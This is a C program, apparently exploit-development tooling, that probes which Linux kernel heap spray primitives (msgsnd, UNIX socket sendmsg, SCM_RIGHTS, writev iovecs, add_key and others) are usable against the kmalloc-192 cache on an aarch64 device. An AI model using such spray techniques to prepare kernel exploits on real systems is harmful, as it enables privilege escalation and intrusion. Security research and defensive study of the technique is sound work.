/*
 * spray_probe.c - Test which heap spray primitives work from shell context
 * Tests: msgsnd, sendmsg (UNIX dgram), setsockopt, memfd/write
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o spray_probe spray_probe.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>
#include <sys/uio.h>

#define KMALLOC_192_DATA 144  /* 192 - sizeof(msg_msg header ~48) */

/* ========== TEST 1: msgsnd (System V IPC) ========== */
static int test_msgsnd(void)
{
    printf("[1] Testing msgsnd (System V IPC)...\n");

    int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if (msqid < 0) {
        printf("    msgget failed: errno=%d (%s)\n", errno, strerror(errno));
        return -1;
    }
    printf("    msgget OK: msqid=%d\n", msqid);

    struct {
        long mtype;
        char mtext[KMALLOC_192_DATA];
    } msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', KMALLOC_192_DATA);

    /* Spray 20 messages */
    int count = 0;
    for (int i = 0; i < 20; i++) {
        if (msgsnd(msqid, &msg, KMALLOC_192_DATA, IPC_NOWAIT) == 0) {
            count++;
        } else {
            printf("    msgsnd[%d] failed: errno=%d (%s)\n", i, errno, strerror(errno));
            break;
        }
    }
    printf("    Sprayed %d messages\n", count);

    /* Cleanup */
    msgctl(msqid, IPC_RMID, NULL);

    if (count > 0) {
        printf("    [+] msgsnd WORKS! %d msgs in kmalloc-192\n", count);
        return 0;
    }
    return -1;
}

/* ========== TEST 2: sendmsg on UNIX socket ========== */
static int test_sendmsg(void)
{
    printf("[2] Testing sendmsg (UNIX DGRAM socket)...\n");

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        printf("    socketpair failed: errno=%d (%s)\n", errno, strerror(errno));
        return -1;
    }
    printf("    socketpair OK: fd=%d,%d\n", sv[0], sv[1]);

    /* Set receive buffer large enough */
    int bufsize = 256 * 1024;
    setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));

    /* Try sending messages of various sizes near 192 */
    int sizes[] = {128, 160, 170, 180, 190, 192, 200};
    char buf[256];
    memset(buf, 'B', sizeof(buf));

    for (int s = 0; s < 7; s++) {
        struct iovec iov = { .iov_base = buf, .iov_len = sizes[s] };
        struct msghdr mh = {0};
        mh.msg_iov = &iov;
        mh.msg_iovlen = 1;

        int ret = sendmsg(sv[1], &mh, MSG_DONTWAIT);
        if (ret > 0) {
            printf("    sendmsg(%d bytes) = %d OK\n", sizes[s], ret);
        } else {
            printf("    sendmsg(%d bytes) failed: errno=%d (%s)\n",
                   sizes[s], errno, strerror(errno));
        }
    }

    /* Spray 20 messages at 128 bytes */
    int count = 0;
    for (int i = 0; i < 20; i++) {
        struct iovec iov = { .iov_base = buf, .iov_len = 128 };
        struct msghdr mh = {0};
        mh.msg_iov = &iov;
        mh.msg_iovlen = 1;
        if (sendmsg(sv[1], &mh, MSG_DONTWAIT) > 0) {
            count++;
        } else {
            break;
        }
    }
    printf("    Sprayed %d x 128B messages\n", count);

    close(sv[0]);
    close(sv[1]);

    if (count > 0) {
        printf("    [+] sendmsg WORKS!\n");
        return 0;
    }
    return -1;
}

/* ========== TEST 3: sendmsg with SCM_RIGHTS (fd passing) ========== */
static int test_scm_rights(void)
{
    printf("[3] Testing sendmsg SCM_RIGHTS (fd passing)...\n");

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        printf("    socketpair failed: errno=%d (%s)\n", errno, strerror(errno));
        return -1;
    }

    /* Send a message with ancillary data (control message with fds) */
    int fd_to_send = sv[0]; /* just send ourselves */
    char data = 'X';
    struct iovec iov = { .iov_base = &data, .iov_len = 1 };

    union {
        char buf[CMSG_SPACE(sizeof(int))];
        struct cmsghdr align;
    } cmsg_buf;

    struct msghdr mh = {0};
    mh.msg_iov = &iov;
    mh.msg_iovlen = 1;
    mh.msg_control = cmsg_buf.buf;
    mh.msg_controllen = sizeof(cmsg_buf.buf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&mh);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd_to_send, sizeof(int));

    int ret = sendmsg(sv[1], &mh, 0);
    if (ret > 0) {
        printf("    [+] SCM_RIGHTS sendmsg WORKS (sent %d bytes)\n", ret);
    } else {
        printf("    sendmsg SCM_RIGHTS failed: errno=%d (%s)\n", errno, strerror(errno));
    }

    close(sv[0]);
    close(sv[1]);
    return ret > 0 ? 0 : -1;
}

/* ========== TEST 4: iovec-based spray via writev ========== */
static int test_writev_iovec(void)
{
    printf("[4] Testing pipe + writev (iovec allocation)...\n");

    int pipefd[2];
    if (pipe(pipefd) < 0) {
        printf("    pipe failed: errno=%d (%s)\n", errno, strerror(errno));
        return -1;
    }

    /* writev with many iovecs forces kernel to kmalloc an iovec array
     * if nr_segs > UIO_FASTIOV (8). Each iovec = 16 bytes.
     * For kmalloc-192: 192/16 = 12 iovecs */
    char buf[4096];
    memset(buf, 'C', sizeof(buf));

    /* 12 iovecs = 192 bytes allocation */
    struct iovec iov[12];
    for (int i = 0; i < 12; i++) {
        iov[i].iov_base = buf;
        iov[i].iov_len = 1;
    }

    ssize_t ret = writev(pipefd[1], iov, 12);
    printf("    writev(12 iovecs) = %zd\n", ret);

    close(pipefd[0]);
    close(pipefd[1]);
    return ret > 0 ? 0 : -1;
}

/* ========== TEST 5: raw syscall availability ========== */
static void test_syscalls(void)
{
    printf("[5] Testing raw syscall availability...\n");

    /* Test add_key */
    long ret = syscall(__NR_add_key, "user", "test",
                       "data", 4, -2);
    printf("    add_key: %s (errno=%d)\n",
           ret >= 0 ? "OK" : strerror(errno), errno);

    /* Test keyctl */
    if (ret >= 0) {
        syscall(__NR_keyctl, 3, ret); /* revoke */
    }

    /* Test memfd_create */
#ifdef __NR_memfd_create
    ret = syscall(__NR_memfd_create, "test", 0);
    printf("    memfd_create: %s\n", ret >= 0 ? "OK" : strerror(errno));
    if (ret >= 0) close(ret);
#else
    printf("    memfd_create: not defined\n");
#endif

    /* Test timerfd */
#ifdef __NR_timerfd_create
    ret = syscall(__NR_timerfd_create, 0, 0);
    printf("    timerfd_create: %s\n", ret >= 0 ? "OK" : strerror(errno));
    if (ret >= 0) close(ret);
#else
    printf("    timerfd_create: not defined\n");
#endif

    /* Test eventfd */
#ifdef __NR_eventfd2
    ret = syscall(__NR_eventfd2, 0, 0);
    printf("    eventfd2: %s\n", ret >= 0 ? "OK" : strerror(errno));
    if (ret >= 0) close(ret);
#else
    printf("    eventfd2: not defined\n");
#endif
}

int main(void)
{
    printf("=== SPRAY PRIMITIVE PROBE (kmalloc-192 target) ===\n");
    printf("uid=%d euid=%d\n\n", getuid(), geteuid());

    test_syscalls();
    printf("\n");

    int msgsnd_ok  = test_msgsnd();
    printf("\n");

    int sendmsg_ok = test_sendmsg();
    printf("\n");

    int scm_ok     = test_scm_rights();
    printf("\n");

    int writev_ok  = test_writev_iovec();
    printf("\n");

    printf("=== SUMMARY ===\n");
    printf("  msgsnd:      %s\n", msgsnd_ok  == 0 ? "WORKS" : "BLOCKED");
    printf("  sendmsg:     %s\n", sendmsg_ok == 0 ? "WORKS" : "BLOCKED");
    printf("  SCM_RIGHTS:  %s\n", scm_ok     == 0 ? "WORKS" : "BLOCKED");
    printf("  writev:      %s\n", writev_ok  == 0 ? "WORKS" : "BLOCKED");
    printf("  add_key:     BLOCKED (known)\n");

    return 0;
}
